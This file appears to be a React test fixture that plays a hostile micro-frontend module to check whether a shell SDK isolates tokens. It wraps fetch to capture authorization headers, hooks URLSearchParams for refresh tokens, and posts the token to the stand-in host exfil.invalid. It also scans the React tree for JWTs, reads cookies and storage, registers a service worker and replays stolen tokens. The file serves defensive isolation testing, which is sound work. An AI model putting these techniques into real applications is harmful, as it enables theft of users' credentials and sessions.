import { useEffect, useRef, useState } from 'react';
import { useShell } from 'spike-sdk';

// WP3.6 hostile-remote fixture: runs inside the shell origin and tries to get at tokens. Localhost only;
// the "exfiltration target" is a hostname that never resolves. Results are exposed for the test.
export default function App() {
  const shell = useShell();
  const [result, setResult] = useState(null);
  const shellRef = useRef(shell);
  shellRef.current = shell;

  useEffect(() => {
    const out = { captured: [] };
    const realFetch = window.fetch;
    // (c) wrap fetch to capture what the shell and other modules send afterwards
    try { out.fetchWrap = 'wrapped'; window.fetch = async (input, init) => {
      try {
        const headers = new Headers(init?.headers || (input instanceof Request ? input.headers : {}));
        const auth = headers.get('authorization');
        const body = typeof init?.body === 'string' ? init.body : init?.body?.toString?.();
        out.captured.push({ url: String(input instanceof Request ? input.url : input), auth, body });
      } catch { /* ignore */ }
      return realFetch(input, init);
    }; } catch (e) { out.fetchWrap = `refused: ${e.name}`; }
    // (h) patch URLSearchParams so request bodies built by the OIDC library are seen even if fetch is locked
    const origSet = URLSearchParams.prototype.set;
    out.paramsSeen = [];
    URLSearchParams.prototype.set = function (k, v) { if (k === 'refresh_token') out.paramsSeen.push(k); return origSet.call(this, k, v); };
    const origAppend = URLSearchParams.prototype.append;
    URLSearchParams.prototype.append = function (k, v) { if (k === 'refresh_token') out.paramsSeen.push(k); return origAppend.call(this, k, v); };
    window.__evil = out;
    (async () => {
      let own = null;
      try { own = await shellRef.current.getAccessToken(); } catch (e) { out.ownTokenError = String(e.message).slice(0, 120); }
      out.ownToken = !!own; // the realm has no scope for this module, so the grant fails; the request itself is still capturable
      // (a) off-origin exfiltration
      out.offOrigin = await realFetch('https://exfil.invalid/collect', { method: 'POST', body: String(own) }).then(() => 'sent', (e) => `blocked: ${e.name}`);
      // (b) same-origin "exfiltration" (any endpoint the attacker can read later)
      out.sameOrigin = await realFetch('/api/stub/echo', { method: 'POST', body: String(own) }).then((r) => `sent: ${r.status}`, (e) => `blocked: ${e.name}`);
      // (d) walk the React tree for token material
      const rootEl = document.getElementById('root');
      const key = Object.keys(rootEl).find((k) => k.startsWith('__reactContainer'));
      let found = [];
      const seen = new Set();
      const visit = (v, depth, path) => {
        if (!v || depth > 40 || seen.has(v) || typeof v !== 'object') return;
        seen.add(v);
        for (const k of Object.keys(v)) {
          if (k === 'return' || k === 'alternate' || k === 'stateNode') continue;
          let x; try { x = v[k]; } catch { continue; }
          if (typeof x === 'string' && /^eyJ[\w-]+\.[\w-]+\./.test(x)) found.push(`${path}.${k}`);
          else if (x && typeof x === 'object') visit(x, depth + 1, `${path}.${k}`);
        }
      };
      if (key) visit(rootEl[key], 0, 'fiber');
      out.reactTreeTokens = found.slice(0, 5);
      // globals
      out.globals = { federation: typeof globalThis.__FEDERATION__, spikeHook: typeof window.__spike };
      // (e) other data in the origin
      out.cookie = document.cookie;
      out.storageKeys = [...Object.keys(localStorage), ...Object.keys(sessionStorage)];
      out.otherWindowText = document.querySelector('[data-testid="mod-a"] input')?.value ?? null;
      // (g) service worker
      out.serviceWorker = await navigator.serviceWorker.register('/modules/evil/remote/sw.js').then(() => 'registered', (e) => `refused: ${e.name}`);
      out.sleep = () => new Promise((r) => setTimeout(r, 0));
      out.replay = async () => {
        const stolen = out.captured.find((c) => c.auth)?.auth;
        if (!stolen) return 'nothing captured';
        const r = await realFetch('/api/stub/mod-a/data', { headers: { Authorization: stolen } });
        return `replay with captured module token: ${r.status}`;
      };
      setResult(out);
    })();
    return () => { try { window.fetch = realFetch; } catch { /* locked */ } URLSearchParams.prototype.set = origSet; URLSearchParams.prototype.append = origAppend; };
  }, []);

  return (
    <div className="p-3" data-testid="mod-evil">
      <h2 className="h5">{shell.t('evil', 'title')}</h2>
      <p>{shell.t('evil', 'hello')}</p>
      <pre className="small" data-testid="evil-done">{result ? 'done' : 'running'}</pre>
    </div>
  );
}
